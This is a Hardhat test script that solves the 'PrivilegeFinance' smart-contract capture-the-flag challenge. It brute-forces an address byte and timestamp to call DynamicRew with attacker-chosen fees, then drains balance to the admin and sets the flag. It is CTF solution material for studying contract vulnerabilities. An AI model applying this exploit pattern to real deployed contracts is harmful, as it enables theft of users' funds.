import { loadFixture } from '@nomicfoundation/hardhat-toolbox/network-helpers';
import { expect } from 'chai';
import { ethers } from 'hardhat';
import { Wallet } from 'ethers';
describe('PrivilegeFinance', function () {
  let owner: Wallet;
  let user: Wallet;
  let user2: Wallet;
  let challenge: any;

  async function deployOneYearLockFixture() {
    // Contracts are deployed using the first signer/account by default
    [owner, user, user2] = await (ethers as any).getSigners();
    challenge = await (await ethers.getContractFactory('PrivilegeFinance'))
      .connect(owner)
      .deploy();

    console.log('challenge', await challenge.getAddress());
    console.log('owner', await owner.getAddress());
    console.log('user', await user.getAddress());
    console.log('user2', await user2.getAddress());
  }

  beforeEach(async function () {
    await loadFixture(deployOneYearLockFixture);
  });

  it('solve', async function () {
    const userAddress = await user.getAddress();
    await challenge.connect(user).Airdrop();
    await challenge
      .connect(user)
      .deposit(
        ethers.ZeroAddress,
        await challenge.balances(userAddress),
        await user2.getAddress()
      );
    await challenge.connect(user).withdraw(ethers.ZeroAddress, 2000);

    // Set dynamicRew
    const referrerFees =
      BigInt(15000000 * 100) / (await challenge.balances(userAddress));
    const transferRate = 50;
    await dynamicRew(referrerFees, transferRate);

    // Update balance through transfer token to admin
    const admin = await challenge.admin.staticCall();
    await challenge
      .connect(user)
      .transfer(admin, await challenge.balances(userAddress));

    // Set flag
    await challenge.connect(user2).setflag();
    expect(await challenge.isSolved()).to.be.true;
  });

  async function dynamicRew(referrerFees: any, transferRate: any) {
    const hexStrings: string[] = [];
    for (let i = 0; i < 16; i++) {
      for (let j = 0; j < 16; j++) {
        const hex = (i * 16 + j).toString(16).toUpperCase();
        hexStrings.push(hex.length === 1 ? '0' + hex : hex);
      }
    }

    const msgSenderAddress = '71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0';
    const blocktimestamps = [1677729608, 1677729609];
    var dynamicRewUpdated = false;
    for (const hexString of hexStrings) {
      for (const blocktimestamp of blocktimestamps) {
        var senderAddr = '0x' + msgSenderAddress + hexString;
        try {
          await challenge
            .connect(user)
            .DynamicRew(senderAddr, blocktimestamp, referrerFees, transferRate);
          console.log('senderAddr', senderAddr);
          console.log('blocktimestamp', blocktimestamp);
          dynamicRewUpdated = true;
          break;
        } catch (error) {}

        senderAddr = '0x' + hexString + msgSenderAddress;
        try {
          await challenge.DynamicRew(senderAddr, blocktimestamp, 50, 50);
          console.log('senderAddr', senderAddr);
          console.log('blocktimestamp', blocktimestamp);
          dynamicRewUpdated = true;
          break;
        } catch (error) {}
      }
      if (dynamicRewUpdated) {
        break;
      }
    }
  }
});
